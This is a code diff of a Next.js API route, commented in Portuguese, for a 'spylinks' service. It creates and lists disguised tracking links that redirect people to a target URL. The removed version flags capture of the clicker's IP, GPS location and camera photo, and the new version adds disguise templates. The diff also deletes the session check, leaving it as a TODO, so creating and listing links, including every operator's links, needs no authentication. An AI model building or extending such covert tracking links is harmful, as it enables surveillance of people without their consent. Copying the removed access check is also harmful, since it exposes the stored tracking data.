@@ -1,50 +1,111 @@
-import { NextResponse } from 'next/server';
+import { NextRequest, NextResponse } from 'next/server';
 import { db } from '@/lib/db';
-import { spylinks } from '@/db/schema';
-import { cookies } from 'next/headers';
+import { spylinks } from '@/drizzle/schema';
+import { generateUniqueId, isValidUrl, TEMPLATES, type TemplateId } from '@/lib/utils';
+import { eq, desc } from 'drizzle-orm';
 
-export async function POST(request: Request) {
+// ============================================================
+// POST /api/spylinks — CRIAR NOVO LINK
+// ============================================================
+export async function POST(request: NextRequest) {
   try {
-    const cookieStore = await cookies();
-    const investigatorId = cookieStore.get('session_token')?.value;
+    // TODO: Validar sessão do operador (session_token)
+    // const session = await validateSession(request);
+    // if (!session) return NextResponse.json({ error: 'Não autorizado' }, { status: 401 });
 
-    if (!investigatorId) {
-      return NextResponse.json({ message: 'Não autorizado' }, { status: 401 });
+    const body = await request.json();
+    const { targetUrl, title, category, template, templateConfig, showPreview, expiresAt } = body;
+
+    // --- Validações ---
+    if (!targetUrl || !isValidUrl(targetUrl)) {
+      return NextResponse.json(
+        { error: 'URL de destino inválida. Use http:// ou https://' },
+        { status: 400 }
+      );
     }
 
-    const { targetUrl, category, captureGps, capturePhoto } = await request.json();
-
-    if (!targetUrl) {
-      return NextResponse.json({ message: 'URL de destino obrigatória' }, { status: 400 });
+    // Validar template se fornecido
+    const selectedTemplate: TemplateId = template || 'none';
+    if (!(selectedTemplate in TEMPLATES)) {
+      return NextResponse.json(
+        { error: `Template inválido. Opções: ${Object.keys(TEMPLATES).join(', ')}` },
+        { status: 400 }
+      );
     }
 
-    const id = Math.random().toString(36).substring(2, 8);
+    // Gerar ID único
+    const id = await generateUniqueId();
 
-    await db.insert(spylinks).values({
+    // Montar config do template (merge do default com o customizado)
+    const defaultConfig = TEMPLATES[selectedTemplate].defaultConfig;
+    const mergedConfig = { ...defaultConfig, ...(templateConfig || {}) };
+
+    // Criar o link no banco
+    const [newLink] = await db.insert(spylinks).values({
       id,
-      investigatorId: parseInt(investigatorId) || 1,
+      investigatorId: 1, // TODO: Pegar do session
       targetUrl,
+      title: title || 'Sem título',
       category: category || 'Geral',
-      captureIp: true,
-      captureGps: !!captureGps,
-      capturePhoto: !!capturePhoto,
-    });
+      template: selectedTemplate,
+      templateConfig: mergedConfig,
+      showPreview: showPreview !== false,
+      status: 'active',
+      expiresAt: expiresAt ? new Date(expiresAt) : null,
+    }).returning();
 
+    // Montar a URL curta de rastreamento
     const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 'https://spy-steel.vercel.app';
-    const trackingUrl = baseUrl + '/l/' + id;
+    const trackingUrl = `${baseUrl}/l/${id}`;
 
-    return NextResponse.json({ success: true, trackingUrl, id });
+    return NextResponse.json({
+      success: true,
+      link: {
+        ...newLink,
+        trackingUrl,
+      },
+      template: TEMPLATES[selectedTemplate],
+    }, { status: 201 });
+
   } catch (error) {
-    console.error(error);
-    return NextResponse.json({ message: 'Erro no servidor' }, { status: 500 });
+    console.error('[SPYLINK] Erro ao criar link:', error);
+    return NextResponse.json(
+      { error: 'Erro interno ao criar o link' },
+      { status: 500 }
+    );
   }
 }
 
-export async function GET() {
+// ============================================================
+// GET /api/spylinks — LISTAR TODOS OS LINKS
+// ============================================================
+export async function GET(request: NextRequest) {
   try {
-    const allLinks = await db.select().from(spylinks);
-    return NextResponse.json(allLinks);
+    // TODO: Validar sessão e filtrar por investigatorId
+
+    const allLinks = await db
+      .select()
+      .from(spylinks)
+      .orderBy(desc(spylinks.createdAt));
+
+    const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 'https://spy-steel.vercel.app';
+
+    const linksWithUrl = allLinks.map(link => ({
+      ...link,
+      trackingUrl: `${baseUrl}/l/${link.id}`,
+    }));
+
+    return NextResponse.json({
+      success: true,
+      links: linksWithUrl,
+      total: linksWithUrl.length,
+    });
+
   } catch (error) {
-    return NextResponse.json({ message: 'Erro ao buscar links' }, { status: 500 });
+    console.error('[SPYLINK] Erro ao listar links:', error);
+    return NextResponse.json(
+      { error: 'Erro interno ao buscar links' },
+      { status: 500 }
+    );
   }
 }
